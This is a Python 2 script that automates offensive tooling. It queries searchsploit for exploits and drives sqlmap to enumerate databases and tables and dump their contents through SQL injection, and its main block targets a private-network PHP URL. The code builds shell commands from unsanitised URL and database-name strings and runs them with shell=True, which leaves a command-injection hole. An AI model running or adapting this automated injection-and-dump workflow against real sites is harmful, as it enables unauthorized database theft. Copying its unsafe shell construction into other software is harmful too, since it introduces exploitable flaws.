__author__ = 'ruluo1992-PC'

from string import Template
import subprocess
import result
import os
import re

def exploit_db(content, result):
    command_t = Template('searchsploit ${content}')
    command = command_t.substitute(lang = 'Python', content = content)
    process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE)
    process.wait()
    output = process.stdout.readlines()
    basedir = '/usr/share/exploitdb/platforms'
    for line in output:
        line = line.replace('\n','')
        parts = line.split('|')
        if len(parts) < 2:
            continue
        parts[0] = parts[0].strip()
        parts[1] = parts[1].strip()
        result.exploit_db[parts[0]] = basedir + parts[1]


def sqlmap_finddbs(url, result):
    command_t = Template('sqlmap -u ${target} --smart --batch --dbs --disable-coloring')
    command = command_t.substitute(lang = 'Python', target = url)
    process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE)
    process.wait()
    output = process.stdout.readlines()
    for line in output:
        if(line.startswith('[*]')):
            databasename = line[4:]
            if(databasename.startswith('starting') or databasename.startswith('shutting')):
                continue;
            else:
                databasename = databasename[0:len(databasename) - 1]
                result.sqlmap_dbs.append(databasename)

#if no databasename(access etc.), use #
def sqlmap_findtables(url, databasenamme, result):
    if databasenamme == '#':
        command_t = Template('sqlmap -u ${target} --smart --batch --tables --disable-coloring')
        command = command_t.substitute(lang = 'Python', target = url)
    else:
        command_t = Template('sqlmap -u ${target} --smart --batch -D ${database} --tables --disable-coloring')
        command = command_t.substitute(lang = 'Python', target = url, database=databasenamme)
    process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE)
    process.wait()
    output = process.stdout.readlines()
    tables = []
    for line in output:
        if line.startswith('|'):
            parts = line.split(' ')
            tables.append(parts[1])
    result.sqlmap_tables[databasenamme] = tables

def sqlmap_dumptables(url, databasenamme, table, result):
    if databasenamme == '#':
        command_t = Template('sqlmap -u ${target} --smart --batch -T ${table} --dump --disable-coloring')
        command = command_t.substitute(lang = 'Python', target = url, table = table)
    else:
        command_t = Template('sqlmap -u ${target} --smart --batch -D ${database} -T ${table} --dump --disable-coloring')
        command = command_t.substitute(lang = 'Python', target = url, database=databasenamme, table = table)
    print command
    process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE)
    process.wait()
    output = process.stdout.readlines()
    for line in output:
        if 'dumped to CSV file' in line:
            m = re.findall(r'\'(.*?)\'', line)
            if m:
                path = m[1]
            if path in result.sqlmap_dumpfiles:
                continue
            else:
                result.sqlmap_dumpfiles.append(path)
def sqlmap(url, result):
    command_t = Template('sqlmap -u ${target} --smart --batch --dump')
    command = command_t.substitute(lang = 'Python', target = url)
    print command
    #process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE)
    #process.wait()
    #output = process.stdout.readlines()
    basedir = '/usr/share/sqlmap/output/'
    m = re.search(r'http://(.+?)/', url)
    hostname = m.group(1)
    outputpath = basedir + hostname + '/' + 'dump/'
    print outputpath
    #all_file = get_recursive_file_list(outputpath)
    #result.sqlmap_dumpfile = all_file


def get_recursive_file_list(path):
    current_files = os.listdir(path)
    all_files = []
    for file_name in current_files:
        full_file_name = os.path.join(path, file_name)
        if(full_file_name.endswith('.csv')):
            all_files.append(full_file_name)

        if os.path.isdir(full_file_name):
            next_level_files = get_recursive_file_list(full_file_name)
            all_files.extend(next_level_files)

    return all_files


if __name__ == '__main__':
    r = result.result()
    url = r'http://10.1.153.33/htdocs/gstbk.php?id=1'
    sqlmap_finddbs(r'http://10.1.153.33/htdocs/gstbk.php?id=1', r)
    for db in r.sqlmap_dbs:
        print db
    #sqlmap_findtables(url, 'www', r)
    #tables = r.sqlmap_tables['www']
    #for table in tables:
    #    print table
    #sqlmap_dumptables(url, 'www', 'user', r)
    #print r.sqlmap_dumpfiles
    #exploit_db('wordpress', r)
    #for key in r.exploit_db.keys():
    #    print key + "|" + r.exploit_db[key]